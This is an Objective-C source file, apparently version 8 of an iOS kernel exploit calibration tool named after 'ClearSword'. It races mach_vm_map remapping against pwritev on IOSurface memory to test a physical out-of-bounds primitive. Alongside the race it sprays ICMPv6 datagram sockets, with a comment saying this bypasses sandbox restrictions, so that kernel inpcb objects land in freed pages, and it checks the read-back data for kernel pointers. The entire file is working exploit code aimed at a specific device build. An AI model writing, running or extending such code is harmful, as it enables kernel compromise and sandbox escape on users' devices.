// CSRaceCalib.m
// v8: The ClearSword SOCK_DGRAM Socket Spray Version

#import "CSRaceCalib.h"

#include <dlfcn.h>
#include <errno.h>
#include <fcntl.h>
#include <mach/mach.h>
#include <mach/mach_time.h>
#include <pthread.h>
#include <pthread/qos.h>
#include <stdarg.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/icmp6.h>
#include <sys/uio.h>
#include <unistd.h>

typedef struct __IOSurface *IOSurfaceRef;
kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t *address, mach_vm_size_t size, mach_vm_offset_t mask, int flags, mem_entry_name_port_t object, memory_object_offset_t offset,
                          boolean_t copy, vm_prot_t cur_protection, vm_prot_t max_protection, vm_inherit_t inheritance);
kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags);
kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address, mach_vm_size_t size);

typedef IOSurfaceRef (*IOSurfaceCreate_t)(CFDictionaryRef);
typedef void *(*IOSurfaceGetBaseAddress_t)(IOSurfaceRef);
typedef void (*IOSurfacePrefetchPages_t)(IOSurfaceRef);

#define PAGE_TAG_BASE 0xC0DEC0DE00000000ULL
#define PAGE_ID(i) (PAGE_TAG_BASE | (uint64_t)(i))
#define M0_TAG      0xA11AA11AA11AA11AULL

#define RC_ITERS_H  3000
#define RC_TRIES    30
#define RC_STRIDE   8
#define RC_NQ       (0xf00 / 8)

/* Socket Spray Constants (matching ClearSword socket.c) */
#define SOCK_SPRAY_BURST 512
#define SOCK_SPRAY_DELAY 50

static volatile int rc_started = 0;
static volatile int rc_go = 0;
static volatile int rc_raceOn = 0;
static volatile mach_vm_address_t rc_mapAddr = 0;
static volatile mach_vm_size_t rc_mapSize = 0;
static volatile mach_port_t rc_mapObj = MACH_PORT_NULL;
static volatile mach_vm_offset_t rc_mapOff = 0;
static volatile uint64_t rc_mapErr = 0;

static volatile int rc_sprayGo = 0;
static volatile uint64_t rc_sprayAllocs = 0;
static volatile uint64_t rc_sprayFrees = 0;

static void *rc_swap_thread(void *arg) {
    (void)arg;
    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
    while (!rc_started);
    while (rc_go) {
        while (!rc_raceOn && rc_go);
        if (!rc_go) break;
        mach_vm_address_t a = rc_mapAddr;
        kern_return_t kr = mach_vm_map(mach_task_self(), &a, rc_mapSize, 0,
                                       VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                                       rc_mapObj, rc_mapOff, false,
                                       VM_PROT_DEFAULT, VM_PROT_DEFAULT,
                                       VM_INHERIT_NONE);
        if (kr != KERN_SUCCESS) rc_mapErr++;
        rc_raceOn = 0;
    }
    return NULL;
}

/* The ClearSword Socket Spray Thread (SOCK_DGRAM) */
static void *rc_socket_spray_thread(void *arg) {
    (void)arg;
    pthread_set_qos_class_self_np(QOS_CLASS_USER_INITIATED, 0);

    while (rc_sprayGo) {
        int fds[SOCK_SPRAY_BURST];
        int count = 0;
        
        // Spray sockets (allocates inpcb in kernel)
        // FIX: Use SOCK_DGRAM instead of SOCK_RAW to bypass sandbox restrictions
        for (int i = 0; i < SOCK_SPRAY_BURST; i++) {
            fds[i] = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
            if (fds[i] >= 0) {
                count++;
            }
        }
        
        // Close them all (frees inpcb, physical pages return to pool)
        for (int i = 0; i < SOCK_SPRAY_BURST; i++) {
            if (fds[i] >= 0) {
                close(fds[i]);
            }
        }
        
        rc_sprayAllocs += count;
        rc_sprayFrees += count;
        usleep(SOCK_SPRAY_DELAY);
    }
    return NULL;
}

@implementation CSRaceCalib

static int g_rc_log_fd = -1;
static NSMutableString *g_rc_log_str = nil;

static void rc_log(const char *fmt, ...) {
    char buf[4096];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    fprintf(stderr, "%s\n", buf);
    fflush(stderr);
    if (g_rc_log_fd >= 0) {
        write(g_rc_log_fd, buf, strlen(buf));
        write(g_rc_log_fd, "\n", 1);
        fcntl(g_rc_log_fd, F_FULLFSYNC);
    }
    if (g_rc_log_str) [g_rc_log_str appendFormat:@"%s\n", buf];
    usleep(1000);
}

typedef enum { C_M0, C_CORRECT, C_WRONG, C_FOREIGN, C_ZERO, C_PARTIAL } rc_cls_t;

static rc_cls_t rc_cls(const uint64_t *buf, uint32_t expected, uint32_t npages,
                       uint64_t *got, int32_t *delta) {
    uint64_t first = buf[0];
    int all = 1;
    for (int i = 1; i < RC_NQ; i++) if (buf[i] != first) { all = 0; break; }
    *got = first;
    *delta = 0;
    if (!all) return C_PARTIAL;
    if (first == 0) return C_ZERO;
    if (first == M0_TAG) return C_M0;
    if ((first & 0xFFFFFFFF00000000ULL) == PAGE_TAG_BASE) {
        uint32_t idx = (uint32_t)first;
        if (idx == expected) return C_CORRECT;
        if (idx < npages) { *delta = (int32_t)idx - (int32_t)expected; return C_WRONG; }
    }
    /* Check for kernel pointers (inpcb structure fields) */
    /* inpcb starts with LIST_ENTRY (pointers). If we see 0xfffffff0..., it's a kernel object! */
    if ((first >> 36) == 0xfffffff0ULL) return C_FOREIGN;
    /* Also check offset 0x40 (inpcb.inp_socket) which is a common pointer */
    if ((buf[8] >> 36) == 0xfffffff0ULL) return C_FOREIGN;
    
    return C_FOREIGN;
}

static CFNumberRef RCNUM(int64_t v) {
    return CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &v);
}

+ (NSString *)runCalib {
    g_rc_log_str = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *lp = [docs stringByAppendingPathComponent:@"racecalib_log.txt"];
    g_rc_log_fd = open([lp UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);
    rc_log("time %s", [[[NSDate date] description] UTF8String]);
    rc_log("=== phys_oob calib v8 — SOCK_DGRAM SOCKET SPRAY (A14 23F77) ===");
    rc_log("logfile: %s", [lp UTF8String]);
    rc_log("vm_page_size=0x%lx", vm_page_size);

    void *iosf = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    IOSurfaceCreate_t pCreate = (IOSurfaceCreate_t)dlsym(iosf, "IOSurfaceCreate");
    IOSurfaceGetBaseAddress_t pBase = (IOSurfaceGetBaseAddress_t)dlsym(iosf, "IOSurfaceGetBaseAddress");
    IOSurfacePrefetchPages_t pPrefetch = (IOSurfacePrefetchPages_t)dlsym(iosf, "IOSurfacePrefetchPages");
    if (!pCreate || !pBase) { rc_log("STOP no IOSurface"); goto done; }
    rc_log("IOSurfacePrefetchPages %s", pPrefetch ? "resolved" : "MISSING");

    uint64_t hmarker = ((uint64_t)arc4random() << 32) | arc4random();

    IOSurfaceRef surfBig = pCreate((__bridge CFDictionaryRef)@{ @"IOSurfaceAllocSize": @(0x8000), @"IOSurfaceMemoryRegion": @"PurpleGfxMem" });
    IOSurfaceRef surfSmall = pCreate((__bridge CFDictionaryRef)@{ @"IOSurfaceAllocSize": @(0x2000), @"IOSurfaceMemoryRegion": @"PurpleGfxMem" });
    if (!surfBig || !surfSmall) { rc_log("STOP surface create"); goto done; }

    /* Wire the IOSurface pages */
    if (pPrefetch) {
        pPrefetch(surfBig);
        pPrefetch(surfSmall);
        rc_log("prefetch OK on surfBig and surfSmall (wired)");
    }

    mach_port_t pcObjBig = 0, pcObjSmall = 0;
    mach_vm_address_t pcBig = 0, pcSmall = 0;
    mach_vm_size_t sz;
    kern_return_t kr;
    sz = 0x8000;
    kr = mach_make_memory_entry_64(mach_task_self(), &sz, (mach_vm_address_t)pBase(surfBig), VM_PROT_DEFAULT, &pcObjBig, 0);
    if (kr == KERN_SUCCESS)
        kr = mach_vm_map(mach_task_self(), &pcBig, 0x8000, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, pcObjBig, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    if (kr != KERN_SUCCESS) { rc_log("STOP pcBig 0x%x", kr); goto done; }
    sz = 0x2000;
    kr = mach_make_memory_entry_64(mach_task_self(), &sz, (mach_vm_address_t)pBase(surfSmall), VM_PROT_DEFAULT, &pcObjSmall, 0);
    if (kr == KERN_SUCCESS)
        kr = mach_vm_map(mach_task_self(), &pcSmall, 0x2000, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, pcObjSmall, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    if (kr != KERN_SUCCESS) { rc_log("STOP pcSmall 0x%x", kr); goto done; }

    uint64_t m0 = M0_TAG;
    memset_pattern8((void *)pcBig, &m0, 0x8000);
    rc_log("pcBig=0x%llx M0_TAG=0x%llx (page2 qword=0x%llx)", pcBig, M0_TAG, *(uint64_t *)(pcBig + 0x4000));

    mach_vm_address_t searchMap = 0;
    mach_vm_size_t searchSize = 0x2000 * vm_page_size;
    uint32_t npages = (uint32_t)(searchSize / vm_page_size);
    kr = mach_vm_allocate(mach_task_self(), &searchMap, searchSize, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
    if (kr != KERN_SUCCESS) { rc_log("STOP search alloc 0x%x", kr); goto done; }
    for (uint32_t i = 1; i < npages; i += 2) {
        uint64_t id = PAGE_ID(i);
        memset_pattern8((void *)(searchMap + (uint64_t)i * vm_page_size), &id, vm_page_size);
    }
    for (uint32_t i = 0; i < npages; i += 2) {
        uint64_t id = PAGE_ID(i);
        memset_pattern8((void *)(searchMap + (uint64_t)i * vm_page_size), &id, vm_page_size);
    }

    IOSurfaceRef lockSurf = NULL;
    if (pPrefetch) {
        CFMutableDictionaryRef props = CFDictionaryCreateMutable(kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFNumberRef aN = RCNUM((int64_t)searchMap);
        CFNumberRef sN = RCNUM((int64_t)searchSize);
        CFDictionarySetValue(props, CFSTR("IOSurfaceAddress"), aN);
        CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), sN);
        lockSurf = pCreate(props);
        CFRelease(aN); CFRelease(sN); CFRelease(props);
        if (lockSurf) {
            pPrefetch(lockSurf);
            rc_log("mlock/prefetch OK lockSurf=%p size=0x%llx", lockSurf, (uint64_t)searchSize);
        } else {
            rc_log("WARN IOSurfaceCreate(wrap searchMap) failed — running without mlock");
        }
    }

    mach_port_t searchObj = 0;
    sz = searchSize;
    kr = mach_make_memory_entry_64(mach_task_self(), &sz, searchMap, VM_PROT_DEFAULT, &searchObj, 0);
    if (kr != KERN_SUCCESS) { rc_log("STOP search entry 0x%x", kr); goto done; }

    mach_vm_address_t anonMap = 0;
    kr = mach_vm_allocate(mach_task_self(), &anonMap, 0x2000, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) { rc_log("STOP anon 0x%x", kr); goto done; }
    memset((void *)anonMap, 0x41, 0x2000);
    mach_port_t anonObj = 0;
    sz = 0x2000;
    kr = mach_make_memory_entry_64(mach_task_self(), &sz, anonMap, VM_PROT_DEFAULT, &anonObj, 0);
    if (kr != KERN_SUCCESS) { rc_log("STOP anon entry 0x%x", kr); goto done; }

    char tmp[1024];
    confstr(_CS_DARWIN_USER_TEMP_DIR, tmp, sizeof(tmp));
    char pz[1100], pm[1100];
    snprintf(pz, sizeof(pz), "%s%u", tmp, arc4random());
    snprintf(pm, sizeof(pm), "%s%u", tmp, arc4random());
    uint8_t *zbuf = calloc(2, 0x8000);
    FILE *fp = fopen(pz, "w"); fwrite(zbuf, 1, 0x8000, fp); fclose(fp);
    fp = fopen(pm, "w"); fwrite(zbuf, 1, 0x8000, fp); fclose(fp);
    int fdZero = open(pz, O_RDWR);
    int fdMark = open(pm, O_RDWR);
    fcntl(fdZero, F_NOCACHE, 1);
    fcntl(fdMark, F_NOCACHE, 1);
    remove(pz); remove(pm);

    rc_started = 0; rc_go = 1; rc_raceOn = 0; rc_mapErr = 0;
    rc_sprayGo = 1;
    rc_sprayAllocs = 0;
    rc_sprayFrees = 0;
    pthread_t th, thSpray;
    pthread_create(&th, NULL, rc_swap_thread, NULL);
    pthread_create(&thSpray, NULL, rc_socket_spray_thread, NULL); /* SOCKET SPRAY */
    rc_started = 1;
    rc_log("socket spray thread started (burst=%d, SOCK_DGRAM)", SOCK_SPRAY_BURST);

    {
        rc_log("--- H control ---");
        rc_mapAddr = pcSmall; rc_mapSize = 0x2000; rc_mapObj = anonObj; rc_mapOff = 0;
        struct iovec iov = { (void *)(pcSmall + 0x3f00), 0x4000 };
        uint64_t wFail = 0, hits = 0;
        for (int it = 0; it < RC_ITERS_H; it++) {
            mach_vm_address_t a = pcSmall;
            mach_vm_map(mach_task_self(), &a, 0x2000, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObjSmall, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
            *(uint64_t *)(pcSmall + 0x3f00) = hmarker;
            rc_raceOn = 1;
            ssize_t w = pwritev(fdZero, &iov, 1, 0x3f00);
            while (rc_raceOn == 1);
            if (w == -1) {
                wFail++;
                uint64_t rb = 0;
                pread(fdZero, &rb, 8, 0x3f00);
                if (rb != hmarker) hits++;
            }
        }
        rc_log("H: iters=%d wFail=%llu hits=%llu", RC_ITERS_H, wFail, hits);
    }

    rc_log("--- ID sweep delay=0 mlock=%s stride=%d tries=%d (ALL pwritev classified) ---",
           lockSurf ? "yes" : "no", RC_STRIDE, RC_TRIES);
    rc_log("--- spray active: sockets=%llu ---", rc_sprayAllocs);

    uint64_t rbBuf[RC_NQ];
    static const uint8_t zreset[0x1000] = {0};
    uint64_t nOff = 0, nOk = 0, nFail = 0;
    uint64_t okM0=0, okC=0, okW=0, okF=0, okZ=0, okP=0;
    uint64_t flM0=0, flC=0, flW=0, flF=0, flZ=0, flP=0;
    int dumped = 0;
    int failErrno[16] = {0};

    for (uint32_t start = 0; start + 1 < npages; start += RC_STRIDE) {
        mach_vm_offset_t off = (mach_vm_offset_t)start * vm_page_size;
        uint32_t expected = start + 1;
        rc_mapAddr = pcBig; rc_mapSize = 0x8000; rc_mapObj = searchObj; rc_mapOff = off;
        struct iovec iov = { (void *)(pcBig + 0x3f00), 0x4000 };
        nOff++;

        for (int it = 0; it < RC_TRIES; it++) {
            mach_vm_address_t a = pcBig;
            mach_vm_map(mach_task_self(), &a, 0x8000, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObjBig, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
            memset_pattern8((void *)pcBig, &m0, 0x8000);
            pwrite(fdMark, zreset, sizeof(zreset), 0x3f00);

            rc_raceOn = 1;
            ssize_t w = pwritev(fdMark, &iov, 1, 0x3f00);
            int e = errno;
            while (rc_raceOn == 1);

            int isFail = (w == -1);
            if (isFail) {
                nFail++;
                if (e >= 0 && e < 16) failErrno[e]++;
            } else {
                nOk++;
            }

            pread(fdMark, rbBuf, sizeof(rbBuf), 0x4000);
            uint64_t got = 0; int32_t delta = 0;
            rc_cls_t c = rc_cls(rbBuf, expected, npages, &got, &delta);
            uint64_t *bM0 = isFail ? &flM0 : &okM0;
            uint64_t *bC  = isFail ? &flC  : &okC;
            uint64_t *bW  = isFail ? &flW  : &okW;
            uint64_t *bF  = isFail ? &flF  : &okF;
            uint64_t *bZ  = isFail ? &flZ  : &okZ;
            uint64_t *bP  = isFail ? &flP  : &okP;
            switch (c) {
                case C_M0: (*bM0)++; break;
                case C_CORRECT: (*bC)++; break;
                case C_WRONG:
                    (*bW)++;
                    if (dumped < 10) {
                        rc_log("  WRONG %s off=0x%llx expected=%u got=0x%llx delta=%d w=%zd",
                               isFail ? "FAIL" : "OK", (uint64_t)off, expected, got, delta, w);
                        dumped++;
                    }
                    break;
                case C_FOREIGN:
                    (*bF)++;
                    if (dumped < 10) {
                        rc_log("  FOREIGN %s off=0x%llx q0=0x%llx q1=0x%llx w=%zd",
                               isFail ? "FAIL" : "OK", (uint64_t)off, rbBuf[0], rbBuf[1], w);
                        dumped++;
                    }
                    break;
                case C_ZERO: (*bZ)++; break;
                case C_PARTIAL:
                    (*bP)++;
                    if (dumped < 6) {
                        rc_log("  PARTIAL %s off=0x%llx q0=0x%llx q1=0x%llx q-1=0x%llx w=%zd",
                               isFail ? "FAIL" : "OK", (uint64_t)off, rbBuf[0], rbBuf[1], rbBuf[RC_NQ-1], w);
                        dumped++;
                    }
                    break;
            }
        }
    }

    rc_log("offsets=%llu ok=%llu fail=%llu mapErr=%llu", nOff, nOk, nFail, rc_mapErr);
    rc_log("OK  : M0=%llu CORRECT=%llu WRONG=%llu FOREIGN=%llu ZERO=%llu PARTIAL=%llu",
           okM0, okC, okW, okF, okZ, okP);
    rc_log("FAIL: M0=%llu CORRECT=%llu WRONG=%llu FOREIGN=%llu ZERO=%llu PARTIAL=%llu",
           flM0, flC, flW, flF, flZ, flP);
    rc_log("spray totals: sockets=%llu", rc_sprayAllocs);
    for (int e = 0; e < 16; e++) if (failErrno[e]) rc_log("  errno %d count=%d", e, failErrno[e]);

    rc_go = 0; rc_raceOn = 1;
    rc_sprayGo = 0;
    pthread_join(th, NULL);
    pthread_join(thSpray, NULL);

    rc_log("READ: WRONG/FOREIGN on either path = primitive alive.");
    rc_log("OK=M0 + FAIL=ZERO = swap either loses (copy M0) or wins too early (EFAULT, no copy).");
    rc_log("OK=CORRECT = swap won and pwritev copied M1 correctly (no confusion).");
    rc_log("DONE — paste this text back");

    close(fdZero); close(fdMark);
    if (lockSurf) CFRelease(lockSurf);
    mach_vm_deallocate(mach_task_self(), pcBig, 0x8000);
    mach_vm_deallocate(mach_task_self(), pcSmall, 0x2000);
    mach_vm_deallocate(mach_task_self(), searchMap, searchSize);
    mach_vm_deallocate(mach_task_self(), anonMap, 0x2000);
    mach_port_deallocate(mach_task_self(), pcObjBig);
    mach_port_deallocate(mach_task_self(), pcObjSmall);
    mach_port_deallocate(mach_task_self(), searchObj);
    mach_port_deallocate(mach_task_self(), anonObj);
    CFRelease(surfBig); CFRelease(surfSmall);
    free(zbuf);

done:;
    if (g_rc_log_fd >= 0) { close(g_rc_log_fd); g_rc_log_fd = -1; }
    NSString *result = [g_rc_log_str copy];
    g_rc_log_str = nil;
    return result;
}

@end
